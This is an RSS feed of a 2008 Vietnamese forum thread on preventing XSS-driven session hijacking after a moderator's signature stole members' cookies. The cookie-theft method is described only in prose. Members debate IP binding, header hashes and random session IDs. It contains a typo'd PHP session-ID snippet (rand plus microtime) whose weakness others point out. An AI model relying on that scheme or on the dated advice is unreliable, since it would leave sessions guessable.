<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "[Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/8.html</link>
		<description><![CDATA[Latest messages posted in the topic "[Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>[Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Gần đây diễn đàn HVA bị một lỗi xss trong phần chữ ký của thành viên (được hiển thị trên mỗi bài viết nếu thành viên sử dụng chữ ký). Lỗi này do mod gamma95 tìm thấy và "khai thác" được cookie của những thành viên nào đã tò mò "xem con gián" (chữ ký cũ của gamma95).

Cơ chế "khai thác" khá đơn giản, nó dùng xss và gởi giá trị cookie đến một site nào đó. Chủ nhân khai thác (gamma95) có thể xem và sử dụng khi nhận được thông tin này. Tôi không đi sâu vào chi tiết sắp xếp cơ chế "khai thác" này vì nó không phải là trọng tâm của chủ đề. Vấn đề nằm ở chỗ, sau khi lấy được trọn bộ cookie và dùng một công cụ nào đó để "dán" cookie vào để truy cập diễn đàn, <b>người khai thác</b> sẽ có thể đóng vai <b>người bị khai thác</b> (account bị đánh cắp cookie). Đối với các account bình thường thì không có mấy chuyện vui nhưng đối với các account có nhiều chức năng hơn (như của vmods, mods và admins) thì có thể tạo ra dung hại nếu có ý đồ không tốt.

Vậy, ngăn chặn xss để ngăn chặn việc đánh cắp cookie là điều hiển nhiên. Tuy nhiên, nếu xss vẫn còn sót ở đâu đó chưa phát hiện được thì tình trạng "dùng cookie" như trên vẫn là mối đe dọa. Bởi thế, cách khắc phục khả thi và hữu hiệu nhất có thể được là gì?

Mời các bạn thảo luận.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115457</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115457</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 09:06:20]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Ừm, nói về mặt lý thuyết thì có thể dùng thêm địa chỉ IP để nhận dạng. Còn về tính khả thi của phương pháp này thì không dám lạm bàn vì không rõ overhead cả về memory lẫn cpu sẽ là bao nhiêu. Hơn nữa ở VN hay bị dùng qua proxy của ISP nên nhiều user có chung IP.

Tuy nhiên, nếu không có trở ngại về mặt tài nguyên thì chắc là cũng giảm thiểu được kha khá xss. 

Để xem còn cách nào khác.

Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115459</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115459</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 09:36:03]]> GMT</pubDate>
				<author><![CDATA[ StarGhost]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">StarGhost wrote:</cite><br>
		<blockquote>Ừm, nói về mặt lý thuyết thì có thể dùng thêm địa chỉ IP để nhận dạng. Còn về tính khả thi của phương pháp này thì không dám lạm bàn vì không rõ overhead cả về memory lẫn cpu sẽ là bao nhiêu. Hơn nữa ở VN hay bị dùng qua proxy của ISP nên nhiều user có chung IP.

Tuy nhiên, nếu không có trở ngại về mặt tài nguyên thì chắc là cũng giảm thiểu được kha khá xss. 

Để xem còn cách nào khác.

Thân.&nbsp;
		</blockquote>

IP thường là yếu tố đầu tiên mà ai cũng nghĩ đến  :P . Cái khó như bồ đã đưa ra là <i>VN hay bị dùng qua proxy của ISP</i> nên tình hình có vẻ thiếu khả thi rồi. Thêm một trường hợp khá phổ biến nữa đó ISP (hay chính từng công ty) dùng load balancer có 2 IP khác nhau, thay phiên xoay vòng. Cũng là 1 người đăng nhập hợp lệ từ IP thứ nhất, tự dưng load balancer đổi sang IP thứ nhì và dẫn tới tình trang người dùng hợp lệ đó bị "nghi" là hijack session?.

Khai triển tiếp đi :).]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115461</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115461</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 10:12:07]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ có 1 biện pháp hơi ...bất khả thi và cũng hơi phức tạp 1 chút thế này, cứ nêu ra anh em tham khảo nhé :

dùng thêm 1 biến cookie động, tương tự như cơ chế sinh số sequence ngẫu nhiên. Sequence và step sẽ được browser sử dụng để tính sequence tiếp theo. Mỗi lần người dùng click vào 1 link hay submit .... thì phải gọi đến hàm javascript thay đổi biến cookie kia đã --&gt; điều này quá phức tạp (tuy nhiên nếu dùng body onload() thì không có tác dụng, vì khi đó cookie bị lấy sẽ trở thành hợp lệ).
Vậy server có thêm nhiệm vụ là kiểm tra tính hợp lệ của biến cookie này.

nhược điểm của phuơng pháp này khá nhiều:
- hacker cũng có thể thực thi hàm javascript trước khi lấy cookie. (chỉ có thể làm phức tạp hơn chút việc khai thác thôi)
- cookie lưu trong browser không dùng lại được khi người dùng tắt đi và sau 1 thời gian lại kết nối vào diễn đàn.
...

Cứ nêu cho mọi người tham khảo xem sao ^^]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115491</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115491</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 12:36:40]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ @anh conmale: hình như biến comboHash là anh tính toán hash gì đó dựa vào User-Agent. Nhưng mà User-Agent của victim thì Hacker dễ dàng chôm được mà anh ?
Ps: Em nghĩ khó có giải pháp toàn diện để chống XSS phía server-side, vì khi XSS xảy ra thì hacker ko chỉ chôm được Cookie mà còn thể chôm được trọn bộ HTTP Header của victim. 
 :) ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115492</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115492</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 12:52:37]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>có 1 biện pháp hơi ...bất khả thi và cũng hơi phức tạp 1 chút thế này, cứ nêu ra anh em tham khảo nhé :

dùng thêm 1 biến cookie động, tương tự như cơ chế sinh số sequence ngẫu nhiên. Sequence và step sẽ được browser sử dụng để tính sequence tiếp theo. Mỗi lần người dùng click vào 1 link hay submit .... thì phải gọi đến hàm javascript thay đổi biến cookie kia đã --&gt; điều này quá phức tạp (tuy nhiên nếu dùng body onload() thì không có tác dụng, vì khi đó cookie bị lấy sẽ trở thành hợp lệ).
Vậy server có thêm nhiệm vụ là kiểm tra tính hợp lệ của biến cookie này.

nhược điểm của phuơng pháp này khá nhiều:
- hacker cũng có thể thực thi hàm javascript trước khi lấy cookie. (chỉ có thể làm phức tạp hơn chút việc khai thác thôi)
- <font color='red'>cookie lưu trong browser không dùng lại được khi người dùng tắt đi và sau 1 thời gian lại kết nối vào diễn đàn</font>.
...

Cứ nêu cho mọi người tham khảo xem sao ^^&nbsp;
		</blockquote>

Xác định thêm là HVA hoàn toàn không dùng persistent cookie (cookie được lưu trên máy của client) mà chỉ dùng transient cookie (cookie chỉ lưu trên memory của browser). Bởi thế, sau khi tắt bỏ browser, sẽ hoàn toàn không có coookie nằm ở đâu để "dùng lại" cả :).

Việc gamma95 lấy được cookie chỉ có thể dùng được nếu người bị lấy cookie lúc ấy vẫn còn truy cập và diễn đàn và cookie này vẫn còn đang giá trị đối với forum.

Thân mến.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115494</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115494</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 13:00:47]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>@anh conmale: hình như biến comboHash là anh tính toán hash gì đó dựa vào User-Agent. Nhưng mà User-Agent của victim thì Hacker dễ dàng chôm được mà anh ?
Ps: Em nghĩ khó có giải pháp toàn diện để chống XSS phía server-side, vì khi XSS xảy ra thì hacker ko chỉ chôm được Cookie mà còn thể chôm được trọn bộ HTTP Header của victim. 
 :) &nbsp;
		</blockquote>

Hì hì, nếu chỉ dựa vào một dữ liệu là User-Agent thì hỏng bét rồi em  :P . Hash được tạo ra từ càng nhiều combination càng tốt và phải có những điểm đặc thù nào đó. <b>boom_jt</b> đã đưa ra một từ khóa cực kỳ quan trọng: <b>ngẫu nhiên</b>.  Tuy nhiên, boom_jt hơi bị "lạc đề" khi dùng đến giải pháp javascript bởi vì mình đang bàn ở "phía server" mà lị -:-) ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115496</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115496</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 13:08:36]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Ta có thể dùng giá trị  session được tạo ngẫu nhiên cho mỗi user dạng:<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>$sessionid = d5&#40;rand&#40;&#41;.microtime&#40;&#41;&#41;;</pre>
		</div>

Như vậy mỗi người dùng sẽ có một giá trị unique.
Sử dụng cùng với lifetime cho mỗi session.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115504</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115504</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 13:24:37]]> GMT</pubDate>
				<author><![CDATA[ canh_nguyen]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">canh_nguyen wrote:</cite><br>
		<blockquote>Ta có thể dùng giá trị  session được tạo ngẫu nhiên cho mỗi user dạng:<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>$sessionid = d5&#40;rand&#40;&#41;.microtime&#40;&#41;&#41;;</pre>
		</div>

Như vậy mỗi người dùng sẽ có một giá trị unique.
Sử dụng cùng với lifetime cho mỗi session.&nbsp;
		</blockquote>

giá trị unique đó có đảm bảo tránh được việc người lấy cookie có thể dùng nó ko bạn? :-/
@conmale: giải pháp server thì cũng phải kết hợp với client chứ :D ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115515</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115515</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 14:12:44]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>.....
@conmale: giải pháp server thì cũng phải kết hợp với client chứ :D &nbsp;
		</blockquote>

Ngăn ngừa session hijacking mà dùng giải pháp nào ở phía client (javascript) thì gần như là vô dụng bởi vì nó không hề được server validate mà chỉ xảy ra hoàn toàn ở phía client.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115580</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115580</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 19:10:21]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Theo tôi thì để ngăn chặn hình thức tấn công này thì phía server tạo một bộ lọc trong phần chữ ký. Tôi nghĩ vấn đề này khá đơn giản. Trước khi hiển thị chữ ký ra ngoài thì tạo một bộ lọc từ database hoặc đơn giản nhất là lúc user nhập dữ liệu vào phần chữ ký ta sẽ có một bộ lọc kiểm tra tại bước này xem chữ ký đó có hợp lệ hay không rồi mới cho phép lưu vào database tôi nghĩ phương pháp này khả thi hơn.
Thân.

edit: sorry vì chưa đọc kỹ ý của bác commale, bác í nói là ngăn chặn XSS từ phía server tổng quát tôi lại phan ngay cái phần chữ ký :D.

Các cách ngăn chặn các bạn trước đã thảo luận rồi, tôi thấy vấn đề tạo tính ngẫu nhiên cho mỗi phiên truy cập là một giải pháp tốt. Nhưng nếu kết hợp với các thông số từ phía người dùng (chẳng hạn như Web browse người đang truy cập là gì, IP ... hay các thông số khác) để kết hợp tạo ra một phiên truy cập sẽ càng tăng tính an toàn hơn.

Một lần nữa xin lỗi vì cái tật hồ đồ :D
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115593</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115593</link>
				<pubDate><![CDATA[Tue, 19 Feb 2008 21:28:46]]> GMT</pubDate>
				<author><![CDATA[ ThíchHắcKinh]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">ThíchHắcKinh wrote:</cite><br>
		<blockquote>Theo tôi thì để ngăn chặn hình thức tấn công này thì phía server tạo một bộ lọc trong phần chữ ký. Tôi nghĩ vấn đề này khá đơn giản. Trước khi hiển thị chữ ký ra ngoài thì tạo một bộ lọc từ database hoặc đơn giản nhất là lúc user nhập dữ liệu vào phần chữ ký ta sẽ có một bộ lọc kiểm tra tại bước này xem chữ ký đó có hợp lệ hay không rồi mới cho phép lưu vào database tôi nghĩ phương pháp này khả thi hơn.
Thân.

edit: sorry vì chưa đọc kỹ ý của bác commale, bác í nói là ngăn chặn XSS từ phía server tổng quát tôi lại phan ngay cái phần chữ ký :D.

Các cách ngăn chặn các bạn trước đã thảo luận rồi, tôi thấy vấn đề tạo tính ngẫu nhiên cho mỗi phiên truy cập là một giải pháp tốt. Nhưng nếu kết hợp với các thông số từ phía người dùng (chẳng hạn như Web browse người đang truy cập là gì, IP ... hay các thông số khác) để kết hợp tạo ra một phiên truy cập sẽ càng tăng tính an toàn hơn.

Một lần nữa xin lỗi vì cái tật hồ đồ :D
&nbsp;
		</blockquote>

Hì hì. Phần ngăn xss thì ok rồi, lọc cả 2 lần: 1) lọc ngay lúc chữ ký được cập nhật (hoặc chỉnh định) 2) lọc ngay lúc hiển thị.

gamma95 đưa ra nhận định là <i>nếu bị xss thì trọn bộ HTTP headers của client có thể bị chôm hết</i>. Đây là nhận định rất giá trị để đánh giá tổng thể mức dung hại trong hoàn cảnh bị xss và bị chôm cookies + HTTP headers. Tuy nhiên, điểm quan trọng để phòng thủ và exploit ở đây là, sau khi chôm được cookies + HTTP headers, làm sao kẻ tấn công biết được phải dùng những gì trong HTTP headers để có thể tạo ra một hash có giá trị nhằm giả mạo (hijack) session (nếu một hash nào đó trong cookie dùng để validate xem session đó là đồ thật hay đồ giả)?

Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115656</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115656</link>
				<pubDate><![CDATA[Wed, 20 Feb 2008 06:46:51]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Kẻ tấn công không cần biết thuật toán hash là gì, mà chỉ cần sử dụng nguyên xi http header chôm được. Có lẽ đây là vấn đề khá nan giải. Yahoo! Mail hay nhiều trang web khác cũng không có được cơ chế nào chống lại điều này.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115680</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115680</link>
				<pubDate><![CDATA[Wed, 20 Feb 2008 11:19:31]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>Kẻ tấn công không cần biết thuật toán hash là gì, mà chỉ cần sử dụng nguyên xi http header chôm được. Có lẽ đây là vấn đề khá nan giải. Yahoo! Mail hay nhiều trang web khác cũng không có được cơ chế nào chống lại điều này.&nbsp;
		</blockquote>

Hì hì, bởi thế mới có chuyện để bàn  :P 

Tuy vậy, vẫn có những phương pháp ngăn cản hoặc giảm thiểu hoặc làm chậm việc exploit.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115685</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115685</link>
				<pubDate><![CDATA[Wed, 20 Feb 2008 11:36:55]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Em nghĩ là không có cách nào giải quyết được trọn vẹn, vì việc tấn công xảy ra từ phía client. Kẻ tấn công nếu biết nguyên tắc server kiểm tra thì có thể qua được. Chắc chỉ có thể giảm thiểu, hạn chế mà thôi.
Theo em có thể làm như sau: kiểm tra thời gian đăng nhập, thoát. (hiện nay HVA để thời gian time-out khá ít:D nick em bị out rồi mà vẫn thấy CK đang theo dõi chủ đề này.
Thêm một tham số nữa đó là đang view ở trang thứ mấy! (Ví dụ em vào lần đấu: 1. Login: 2. Xem profile:3, Xem bài 19371: 4, xem bài 19375: 5, cũng giống như post 2 bài liên tiếp trùng nhau hoặc refresh 1 page đang load ...
...:-?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115824</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115824</link>
				<pubDate><![CDATA[Thu, 21 Feb 2008 05:08:50]]> GMT</pubDate>
				<author><![CDATA[ CK]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Mấu chốt là ngoài thông tin session ra server phải nhận dạng được clien bằng những thông tin khác, hoặc là cố gắng nhận ra sự truy cập đồng thời từ nhiều máy tính khác nhau qua thái độ duyệt của người dùng.
Theo hướng thứ nhất, server có thể ktra thêm một số thông tin có sẵn của client như rhost, IP,...browser, OS, múi h,...; 
Theo hướng thứ 2:
 - Cookie but not cookie: Yêu cầu client lưu trữ và trả lời server thông tin về last request (url, timestamp). 
 - Xây dựng cây url (sitemap) để nhận ra những truy cập bất thường gây ra do tình trạng  2 người cùng truy cập. Cách này hơi phức tạp và sẽ gây tác dụng phụ với người dùng.

Ngoài ra để hạn chế tác hại, thì những thao tác quan trọng của mod/admin nên bắt confirm bằng pass.

À không biết cơ chế xác thực SSL 2 chiều của  có tác dụng gì không nhỉ.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115836</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115836</link>
				<pubDate><![CDATA[Thu, 21 Feb 2008 10:09:16]]> GMT</pubDate>
				<author><![CDATA[ vivashadow]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">vivashadow wrote:</cite><br>
		<blockquote>Mấu chốt là ngoài thông tin session ra server phải nhận dạng được clien bằng những thông tin khác, hoặc là cố gắng nhận ra sự truy cập đồng thời từ nhiều máy tính khác nhau qua thái độ duyệt của người dùng.
Theo hướng thứ nhất, server có thể ktra thêm một số thông tin có sẵn của client như rhost, IP,...browser, OS, múi h,...; 
Theo hướng thứ 2:
 - Cookie but not cookie: Yêu cầu client lưu trữ và trả lời server thông tin về last request (url, timestamp). 
 - Xây dựng cây url (sitemap) để nhận ra những truy cập bất thường gây ra do tình trạng  2 người cùng truy cập. Cách này hơi phức tạp và sẽ gây tác dụng phụ với người dùng.

Ngoài ra để hạn chế tác hại, thì những thao tác quan trọng của mod/admin nên bắt confirm bằng pass.

À không biết cơ chế xác thực SSL 2 chiều của  có tác dụng gì không nhỉ.&nbsp;
		</blockquote>

Hướng thứ nhất của vivashadow thì đã có bàn ở trên, còn hướng thứ 2, bạn có thể nói rõ thêm về việc "Yêu cầu client lưu trữ và trả lời server thông tin về last request (url, timestamp)" Vì thực chất có lẽ nó cũng không giúp đc gì, vì cái gì thực hiện ở client thì cũng đều có thể bypass được, ngoài ra cơ chế cho việc client làm như vậy là gì?
Vấn đề về url ko có ý kiến vì bồ đã nêu lên đc tác dụng phụ, và mình thì nghĩ là tác dụng phụ này quá lớn :D

Việc confirm thì có lẽ diễn đàn thực hiện khá ok rồi, theo mình biết thì với cookie của mod/admin thì kẻ tấn công có thể sửa, xoá bài, vào đuợc các khu vực chỉ dành cho mod/admin trên diễn đàn, và không thể vào đc cp để thực hiện các chức năng cao hơn (đúng ko nhỉ :-/)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#115846</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#115846</link>
				<pubDate><![CDATA[Thu, 21 Feb 2008 11:05:24]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>[Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote>Gần đây diễn đàn HVA bị một lỗi xss trong phần chữ ký của thành viên (được hiển thị trên mỗi bài viết nếu thành viên sử dụng chữ ký). Lỗi này do mod gamma95 tìm thấy và "khai thác" được cookie của những thành viên nào đã tò mò "xem con gián" (chữ ký cũ của gamma95).

Cơ chế "khai thác" khá đơn giản, nó dùng xss và gởi giá trị cookie đến một site nào đó. Chủ nhân khai thác (gamma95) có thể xem và sử dụng khi nhận được thông tin này. Tôi không đi sâu vào chi tiết sắp xếp cơ chế "khai thác" này vì nó không phải là trọng tâm của chủ đề. Vấn đề nằm ở chỗ, sau khi lấy được trọn bộ cookie và dùng một công cụ nào đó để "dán" cookie vào để truy cập diễn đàn, <b>người khai thác</b> sẽ có thể đóng vai <b>người bị khai thác</b> (account bị đánh cắp cookie). Đối với các account bình thường thì không có mấy chuyện vui nhưng đối với các account có nhiều chức năng hơn (như của vmods, mods và admins) thì có thể tạo ra dung hại nếu có ý đồ không tốt.

Vậy, ngăn chặn xss để ngăn chặn việc đánh cắp cookie là điều hiển nhiên. Tuy nhiên, nếu xss vẫn còn sót ở đâu đó chưa phát hiện được thì tình trạng "dùng cookie" như trên vẫn là mối đe dọa. Bởi thế, cách khắc phục khả thi và hữu hiệu nhất có thể được là gì?

Mời các bạn thảo luận.&nbsp;
		</blockquote>  
Vấn đề mà bác conmale đưa ra thảo luận trên đây là một vấn đề phức tạp và khó. 

Trước hết XSS vulnerability là  một lỗi khó phát hiện, phức tạp và khi nghi ngờ một site có lỗi này thì rất khó kiểm định lại để xác định đó là đúng như vậy hay không. Việc tạo lại một "hiện trường mô phỏng" để  xác định chính xác là site   <i>(do người khác quản lý</i>) có lỗi XSS thì khá phức tạp và mất công sức, thời gian. Ngoài ra hiện nay lỗi XSS cũng có  nhiều loại khác nhau. 

  Khi một server hay một webserver có lỗi XSS thì không thể yêu cầu các user "điều chỉnh" lại máy họ (browser chẳng hạn), như vậy là vô lý, vì họ có "lỗi" gì đâu. Ngoài ra thì không phải user nào cũng biết 'điều chỉnh" máy. Và lại điều quan trọng là, về cơ bản, việc config. các browser không giúp gì cho các user tránh được tác hại do lỗi XSS (hiện diện trên server) gây ra cho họ.

Tuy khá phức tạp về thể loại và quá trình diễn biến, nhưng theo tôi, có những nguyên lý chung của các lỗi XSS là:

- Nó là lỗi của server và chỉ của server mà thôi.

- Lỗi chỉ gây tác hại (<i>ở đây không nên dủng cụm từ "khai thác" lỗi</i>) khi có <font color='yellow'>3 thảnh phần tham gia vào cùng một lúc</font>: webserver có lỗi XSS (<font color='yellow'>1</font>), người đang truy cập vào trang webserver (vào nơi có lỗi XSS) (<font color='yellow'>2)-đây chính là nạn nhân</font>, một malicious webserver hay trang web khác (<font color='yellow'>3</font>) mà webserver hay trang web này có một đường dẫn đến nó từ webserver có lỗi XSS. 
Đừong dẫn này có thễ là loại "bị động", thí dụ  là một đia chỉ URL trên webserver có lỗi XSS, mà muốn tạo liên kết thì nạn nhân (thành phần thứ 2) phải nhấp chuột vào, hoặc là loại "chủ động", thí dụ một image tại một URL của webserver có lỗi XSS, image sẽ được download từ một webserver độc hại (thành phần thứ 3) khi ta truy cập đến URL này. Khi nạn nhân (thành phần thứ 2) truy cập đến URL nói trên thì mối liên kết đến webserver độc hại sẽ "tự động" được thiết lập.
 <i>Xin ghi nhớ là: người truy cập (thành phần thứ 2) vào webserver có lỗi XSS  mới là <b><font color='yellow'>nạn nhân trực tiếp, nạn nhân đầu tiên </font></b>trong đa số trường hợp. Còn webserver (nếu là một forum, thí dụ như vậy) thì chỉ là nạn nhân thứ hai, gián tiếp. Đó là trường hợp anh conmale đã nói ở trên.</i>
..........
(<i>Phải đến cơ quan, sẽ xin viết tiếp ngay</i>)
 
    ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116047</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116047</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 08:54:45]]> GMT</pubDate>
				<author><![CDATA[ PXMMRF]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ Webserver không mắc lỗi XSS và là website mắc lỗi.
Để ngăn XSS từ phía server thì 1 cách hay nhất là dựa trên địa chỉ IP. Tuy nhiên nó lại gặp hạn chế với hệ thống mạng sử dụng load balancing.
=&gt; Chịu! Control code website cho tốt thôi, có thể sử dụng 1 trang filter để lọc tất cả các tham số đầu vào cho hệ thống.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116068</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116068</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 10:52:46]]> GMT</pubDate>
				<author><![CDATA[ Look2Me]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Look2Me wrote:</cite><br>
		<blockquote>Webserver không mắc lỗi XSS và là website mắc lỗi.
&nbsp;
		</blockquote>
Bản thân ứng dụng Web Application bị XSS thì bình thường, ko có gì để nói. Cá biệt có trường hợp bị XSS ở Webserver (Chính xác là bị ở ứng dụng Server Manager). Chi tiết xem tại đây
<span class="link"> http://zhodiac.net-dreamer.net/my-stuff/security/Iplanet-NG-XSS-analysis.pdf</span>
Trong tài liệu này gần như là một trong những tài liệu đầu tiên mở ra hướng khai thác CSRF, XSS kết hợp với CSRF để get root cả server.
<blockquote>Để ngăn XSS từ phía server thì 1 cách hay nhất là dựa trên địa chỉ IP. Tuy nhiên nó lại gặp hạn chế với hệ thống mạng sử dụng load balancing.
=&gt; Chịu! Control code website cho tốt thôi, có thể sử dụng 1 trang filter để <font color='orange'>lọc tất cả các tham số đầu vào</font> cho hệ thống&nbsp;
		</blockquote>
Đối với XSS thì <font color='orange'>lọc đầu vào</font> quan trọng hay <font color='orange'>lọc đầu ra</font> quan trọng nhỉ ? 
 :D ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#116074</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#116074</link>
				<pubDate><![CDATA[Fri, 22 Feb 2008 12:15:19]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Lọc đầu vào (từ người dùng) quan trọng hơn chứ :D (trường hợp tổng quát nói chung với các website nhé ^_^)
lọc đầu ra có vẻ ít khả thi do khó nhận biết đoạn code nào đã bị inject trong cả 1 trang html. (cũng có thể đc, ví dụ: lọc các thẻ html "có vấn đề" nằm trong &lt;div&gt;[bài viết]&lt;/div&gt; của 1 bài viết trên forum chẳng hạn, nhưng đây là trường hợp không tổng quát ...)]]></description>
